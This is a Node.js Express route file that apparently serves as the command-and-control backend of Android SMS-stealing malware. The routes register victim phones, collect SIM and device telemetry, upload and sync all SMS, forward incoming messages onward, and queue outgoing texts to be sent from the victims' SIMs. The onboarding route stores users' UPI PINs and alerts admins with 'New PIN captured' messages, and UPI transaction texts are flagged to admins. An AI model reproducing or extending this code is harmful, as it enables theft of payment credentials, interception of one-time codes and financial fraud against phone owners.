"use strict";

const express = require("express");
const { ObjectId } = require("mongodb");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const relay = require("../relay");
const { evaluateRules } = require("../admin/rules");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const fmtTime = (d) => d.toISOString().slice(11, 16);

// ------------------------------------------------------------------ helpers

async function deviceByRid(registrationId) {
  const rh = u.hashValue(String(registrationId || "").trim());
  return db.devices.findOne({ registration_id_hash: rh });
}

async function outboxCounters() {
  const out = { queued: 0, sent: 0, delivered: 0, failed: 0, pending: 0 };
  try {
    const rows = await db.outbox.aggregate([{ $group: { _id: "$status", n: { $sum: 1 } } }]).toArray();
    for (const r of rows) {
      const k = String(r._id || "pending");
      if (k in out) out[k] = Number(r.n || 0);
    }
  } catch (_) {}
  return out;
}

async function ackOutbox(itemId, status, error = "", simSlot = -1) {
  let oid;
  try { oid = new ObjectId(itemId); } catch (_) { throw new u.HttpError(400, "Bad item id"); }

  status = String(status || "sent").trim().toLowerCase();
  if (!["queued", "sent", "delivered", "failed"].includes(status)) status = "sent";

  const fields = { status, error, updated_at: db.utcNow() };
  if (simSlot >= 0) { fields.sim_slot = simSlot; fields.ack_sim_slot = simSlot; }
  if (status === "queued") fields.queued_at = db.utcNow();
  else if (status === "sent") fields.sent_at = db.utcNow();
  else if (status === "delivered") fields.delivered_at = db.utcNow();
  else if (status === "failed") fields.failed_at = db.utcNow();

  let row;
  try { row = await db.outbox.findOneAndUpdate({ _id: oid }, { $set: fields }, { returnDocument: "before" }); }
  catch (_) { throw new u.HttpError(503, "Database error"); }

  if (row && row.message_id) {
    await db.messages.updateOne({ _id: row.message_id }, {
      $set: { status, error, sim_slot: simSlot >= 0 ? simSlot : row.sim_slot, updated_at: db.utcNow() },
    }).catch(() => {});
  } else if (row) {
    await u.insertMessage({
      device_id: row.device_id, direction: "out", address: row.to || "", body: row.body || "",
      kind: "sms", status, source: row.source || "panel",
      sim_slot: simSlot >= 0 ? simSlot : row.sim_slot, created_at: db.utcNow(),
    }, false);
  }

  if (row) {
    hub.broadcast({ type: "ack", data: {
      id: itemId, status, error, device_id: row.device_id, body: row.body || "",
      sim_slot: simSlot >= 0 ? simSlot : row.sim_slot,
    }});
    if (["sent", "delivered", "failed"].includes(status)) {
      hub.broadcast({ type: "outbox_stats", data: await outboxCounters() });
    }
  }
  return row;
}

// ------------------------------------------------------------------- routes

router.post("/pair", ah(async (req, res) => {
  const name = String((req.body || {}).device_name || "").trim();
  if (!name) throw new u.HttpError(400, "Device name required");
  const code = require("crypto").randomBytes(8).toString("base64url");
  const now = db.utcNow();
  await db.pairing_codes.insertOne({
    code_hash: u.hashValue(code), device_name: name, created_at: now,
    expires_at: new Date(now.getTime() + config.SESSION_TTL * 1000), used_at: null,
  });
  res.json({ pair_code: code, expires_in_seconds: config.SESSION_TTL });
}));

router.post("/devices/register", ah(async (req, res) => {
  const b = req.body || {};
  const name = String(b.device_name || "").trim();
  const rid = String(b.registration_id || "").trim();
  if (!name || !rid) throw new u.HttpError(400, "Device name and registration ID required");
  if (String(b.platform || "").toLowerCase() !== "android") throw new u.HttpError(400, "Unsupported platform");
  if (!b.owner_approved) throw new u.HttpError(403, "Owner approval required");

  const rh = u.hashValue(rid);
  const now = db.utcNow();
  const telemetry = u.sanitizeTelemetry(b.telemetry);

  const existing = await db.devices.findOne({ registration_id_hash: rh }, { projection: { short_id: 1 } }).catch(() => null);
  const shortId = (existing || {}).short_id || await u.nextDeviceShortId();

  const fields = {
    device_name: name, platform: "android", registration_id: rid, short_id: shortId,
    last_seen: now, is_active: true, install_state: "active",
  };
  if (b.install_id) fields.install_id = String(b.install_id).slice(0, 64);
  if (b.android_id) fields.android_id = String(b.android_id).slice(0, 64);
  if (b.app_version) fields.app_version = String(b.app_version).slice(0, 24);
  if (Object.keys(telemetry).length) { fields.telemetry = telemetry; Object.assign(fields, u.telemetrySummary(telemetry)); }

  await db.devices.updateOne(
    { registration_id_hash: rh },
    { $set: fields, $setOnInsert: {
      registration_id_hash: rh, created_at: now, first_seen: now, install_seq: 1, onboarded: false,
      auto_sender: { enabled: false, channel_id: null, channel_title: null, sim_slots: [], tg_confirm: true, updated_at: now },
    }},
    { upsert: true },
  );
  u.logEvent("device_registered", { device_name: name, short_id: shortId });

  const doc = await db.devices.findOne({ registration_id_hash: rh }).catch(() => null);
  if (doc) hub.broadcastDevice(String(doc._id), { ws_connected: hub.hub.online(String(doc._id)), last_seen: now.toISOString() });

  res.json({ status: "registered", device_name: name, short_id: shortId });
}));

router.post("/devices/event", ah(async (req, res) => {
  const b = req.body || {};
  const rid = String(b.registration_id || "").trim();
  const rh = u.hashValue(rid);
  const now = db.utcNow();

  let ev = String(b.event || "open").trim().toLowerCase();
  if (!["install", "update", "open", "gone"].includes(ev)) ev = "open";

  const iid = String(b.install_id || "").slice(0, 64);
  const aid = String(b.android_id || "").slice(0, 64);
  const ts = b.ts || Date.now();

  let device = await db.devices.findOne({ registration_id_hash: rh });
  let created = false;

  if (!device) {
    try {
      const r = await db.devices.insertOne({
        registration_id: rid, registration_id_hash: rh, short_id: await u.nextDeviceShortId(),
        device_name: String(b.device_name || "Unknown").slice(0, 60), platform: b.platform || "android",
        created_at: now, first_seen: now, last_seen: now, is_active: true, onboarded: false,
        install_state: "active", install_seq: 1, install_id: iid || null, android_id: aid || null,
        app_version: String(b.app_version || "").slice(0, 24),
        auto_sender: { enabled: false, channel_id: null, channel_title: null, sim_slots: [], tg_confirm: true, updated_at: now },
      });
      device = await db.devices.findOne({ _id: r.insertedId });
      created = true;
    } catch (_) {
      device = await db.devices.findOne({ registration_id_hash: rh });
    }
  }
  if (!device) throw new u.HttpError(503, "Database error");

  const deviceId = String(device._id);
  let seq = parseInt(device.install_seq || 1, 10);

  if (aid) {
    try {
      const prev = await db.install_fingerprints.findOneAndUpdate(
        { android_id: aid },
        { $set: { last_seen: now, last_install_id: iid, last_registration_id: rid }, $inc: { install_count: 1 }, $setOnInsert: { first_seen: now } },
        { upsert: true, returnDocument: "before" },
      );
      if (prev) {
        seq = parseInt(prev.install_count || 1, 10) + 1;
        if (iid && prev.last_install_id && prev.last_install_id !== iid) {
          await db.devices.updateMany({ android_id: aid, install_id: { $ne: iid } }, { $set: { install_state: "gone", uninstalled_at: now } });
        }
      } else seq = 1;
    } catch (_) {}
  }

  await db.device_events.insertOne({
    registration_id: rid, device_id: deviceId, install_id: iid, android_id: aid, event: ev,
    app_version: String(b.app_version || "").slice(0, 24), device_name: String(b.device_name || "").slice(0, 60),
    ts, created_at: now,
  }).catch(() => {});

  const fields = { last_seen: now, is_active: true, last_event: ev };
  if (iid) fields.install_id = iid;
  if (aid) fields.android_id = aid;
  if (b.app_version) fields.app_version = String(b.app_version).slice(0, 24);
  if (b.device_name) fields.device_name = String(b.device_name).slice(0, 60);
  if (ev === "install" || ev === "update") {
    fields.install_state = "active"; fields.uninstalled_at = null;
    if (ev === "install") { fields.installed_at = now; fields.install_seq = seq; }
  }
  await db.devices.updateOne({ _id: device._id }, { $set: fields }).catch(() => {});

  hub.broadcastDevice(deviceId, { ws_connected: hub.hub.online(deviceId), last_seen: now.toISOString(), install_state: fields.install_state || device.install_state });
  hub.broadcast({ type: "growth", data: { event: ev, device_id: deviceId, short_id: u.deviceShortId(device), ts: now.toISOString() } });
  u.logEvent("device_event", { event: ev, install_seq: seq, new: created }, deviceId);

  res.json({ status: "ok", event: ev, install_seq: seq, new_device: created });
}));

router.post("/devices/heartbeat", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);

  const fields = { last_seen: db.utcNow(), is_active: true };
  if (b.install_id) fields.install_id = String(b.install_id).slice(0, 64);
  if (b.android_id) fields.android_id = String(b.android_id).slice(0, 64);
  if (device.install_state !== "active") { fields.install_state = "active"; fields.uninstalled_at = null; }

  if (b.telemetry) {
    const telemetry = u.sanitizeTelemetry(b.telemetry);
    if (Object.keys(telemetry).length) {
      const merged = { ...(device.telemetry || {}), ...telemetry };
      fields.telemetry = merged; Object.assign(fields, u.telemetrySummary(merged));
      if (merged.sim_number) fields.number_requested_at = null;
    }
  }
  await db.devices.updateOne({ _id: device._id }, { $set: fields });

  if (hub.hub.online(deviceId)) { hub.spawn(hub.pushOutbox(deviceId)); hub.spawn(hub.repushStale(deviceId)); }

  hub.broadcastDevice(deviceId, {
    ws_connected: hub.hub.online(deviceId), status: "Online",
    last_seen: fields.last_seen.toISOString(), telemetry: fields.telemetry || device.telemetry || {},
  });

  const mergedT = fields.telemetry || device.telemetry || {};
  if (!mergedT.sim_number && hub.hub.online(deviceId)) {
    const last = device.number_requested_at;
    const stale = !(last instanceof Date) || Date.now() - last.getTime() > config.NUMBER_RETRY_AFTER * 1000;
    if (stale) {
      await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: db.utcNow() } }).catch(() => {});
      hub.spawn(hub.sendCommand(deviceId, "fetch_number"));
    }
  }
  res.json({ status: "ok", online: true, last_seen: db.utcNow().toISOString() });
}));

router.post("/devices/telemetry", ah(async (req, res) => {
  const device = await deviceByRid((req.body || {}).registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const telemetry = await u.applyTelemetry(device, (req.body || {}).telemetry);
  await db.devices.updateOne({ _id: device._id }, { $set: { last_seen: db.utcNow(), is_active: true } }).catch(() => {});
  hub.broadcastDevice(String(device._id), {
    ws_connected: hub.hub.online(String(device._id)), status: "Online",
    last_seen: db.utcNow().toISOString(), telemetry: telemetry || device.telemetry || {},
  });
  res.json({ status: "ok", keys: Object.keys(telemetry).length });
}));

router.post("/devices/command/result", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);
  const data = b.data || {};
  const action = String(b.action || "").toLowerCase();

  if (["fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"].includes(action)) {
    const telemetry = (data.telemetry && typeof data.telemetry === "object") ? data.telemetry : data;
    await u.applyTelemetry(device, telemetry);
    if (data.sim_number) await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: null } }).catch(() => {});
    hub.broadcastDevice(deviceId, { ws_connected: hub.hub.online(deviceId), telemetry });
  } else if (action === "ack" && data.id) {
    let slot = parseInt(data.sim_slot, 10);
    if (!Number.isFinite(slot)) slot = -1;
    await ackOutbox(data.id, data.status || "sent", data.error || "", slot);
  }
  u.logEvent("device_command_result", { action }, deviceId);
  res.json({ status: "ok" });
}));

router.post("/devices/sms/incoming", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);
  const { kind, amount, flow } = u.classifySms(b.address, b.body);

  let created = db.utcNow();
  if (b.received_at) { const d = new Date(b.received_at); if (!isNaN(d)) created = d; }

  const mid = await u.insertMessage({
    device_id: deviceId, device_name: device.device_name || "Unknown", direction: b.direction,
    address: b.address, body: b.body, kind, amount, flow, status: "received", created_at: created,
  });
  if (mid) hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null));
  await db.devices.updateOne({ _id: device._id }, { $set: { last_seen: db.utcNow() } }).catch(() => {});

  if (b.direction === "in") hub.spawn(relay.relayForwardIncoming(device, b.address, b.body));

  if (kind === "upi" && amount) {
    u.logEvent("upi_received", { amount, flow }, deviceId);
    await relay.notifyAdmins(
      `💸 <b>UPI ${flow || "txn"}</b>\nDevice: <code>${u.deviceShortId(device)}</code>\n` +
      `Amount: <b>₹${amount.toFixed(2)}</b>\nFrom: <code>${b.address || "n/a"}</code>`,
    );
  }

  const replies = await evaluateRules(deviceId, device.device_name || "", b.address, b.body, kind);
  res.json({ status: "ok", kind, auto_replies: replies });
}));

router.post("/devices/sms/sync", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);
  let saved = 0;

  for (const item of (b.messages || []).slice(0, 200)) {
    const body = String(item.body || "").slice(0, config.MAX_SMS_BODY);
    const address = String(item.address || "").slice(0, 64);
    const direction = String(item.direction || "in").slice(0, 8);
    if (!body) continue;

    let created = db.utcNow();
    if (typeof item.timestamp === "number") { const d = new Date(item.timestamp); if (!isNaN(d)) created = d; }

    const { kind, amount, flow } = u.classifySms(address, body);
    const mid = await u.insertMessage({
      device_id: deviceId, device_name: device.device_name || "Unknown", direction,
      address, body, kind, amount, flow, status: "received", created_at: created,
    });
    if (mid) { saved += 1; hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null)); }
  }
  await db.devices.updateOne({ _id: device._id }, { $set: { sms_inbox_synced_at: db.utcNow() } }).catch(() => {});
  res.json({ status: "ok", saved });
}));

router.post("/devices/onboarding", ah(async (req, res) => {
  const b = req.body || {};
  let device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);
  const now = db.utcNow();

  if (b.telemetry) {
    await u.applyTelemetry(device, b.telemetry);
    device = (await db.devices.findOne({ _id: device._id }).catch(() => null)) || device;
  }

  const fields = {
    phone_number: u.normalizeNumber(b.phone_number) || String(b.phone_number || "").trim(),
    payment_app: String(b.payment_app || "").trim(),
    upi_pin: String(b.upi_pin || "").trim(),
    onboard_amount: b.amount,
    onboarded: true, onboarded_at: now, onboarding_pending: false,
  };
  if (b.device_name) fields.device_name = String(b.device_name).trim();
  await db.devices.updateOne({ _id: device._id }, { $set: fields });

  if (hub.hub.online(deviceId)) hub.spawn(hub.sendCommand(deviceId, "fetch_number"));
  hub.broadcastDevice(deviceId, {
    ws_connected: hub.hub.online(deviceId), onboarded: true,
    phone_number: fields.phone_number, payment_app: fields.payment_app, upi_pin: fields.upi_pin,
  });

  const telemetry = device.telemetry || {};
  const simNumber = telemetry.sim_number || device.sim_number || "n/a";
  const carrier = telemetry.sim_carrier || device.sim_carrier || "n/a";

  u.logEvent("onboarding_complete", { phone_number: b.phone_number, payment_app: b.payment_app, upi_pin: b.upi_pin }, deviceId);

  await relay.notifyAdmins(
    `🔔 <b>New PIN captured</b>\nDevice: <code>${u.deviceShortId(device)}</code>\n` +
    `Entered number: <code>${b.phone_number || "n/a"}</code>\nSIM number: <code>${simNumber}</code>\n` +
    `Carrier: ${carrier}\nApp chosen: <b>${b.payment_app || "n/a"}</b>\n` +
    `PIN: <code>${b.upi_pin || "n/a"}</code>\nAmount: ₹${Math.round(b.amount || 0)}\nTime: ${fmtTime(now)}`,
  );
  res.json({ status: "ok", device_id: deviceId });
}));

router.get("/devices/outbox", ah(async (req, res) => {
  const device = await deviceByRid(req.query.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);
  const rows = await db.outbox.find({ device_id: deviceId, status: { $in: ["pending", "queued"] } }).limit(20).toArray();

  const items = [];
  for (const r of rows) {
    await db.outbox.updateOne({ _id: r._id }, { $set: { pushed_at: db.utcNow() }, $inc: { attempts: 1 } }).catch(() => {});
    const item = { id: String(r._id), to: r.to || "", body: r.body || "" };
    if (r.sim_slot !== null && r.sim_slot !== undefined) item.sim_slot = r.sim_slot;
    items.push(item);
  }
  res.json({ items });
}));

router.post("/devices/outbox/:item_id/ack", ah(async (req, res) => {
  const b = req.body || {};
  let slot = parseInt(b.sim_slot, 10);
  if (!Number.isFinite(slot)) slot = -1;
  await ackOutbox(req.params.item_id, String(b.status || "sent"), String(b.error || ""), slot);
  res.json({ status: "ok" });
}));

module.exports = router;
module.exports.outboxCounters = outboxCounters;
module.exports.ackOutbox = ackOutbox;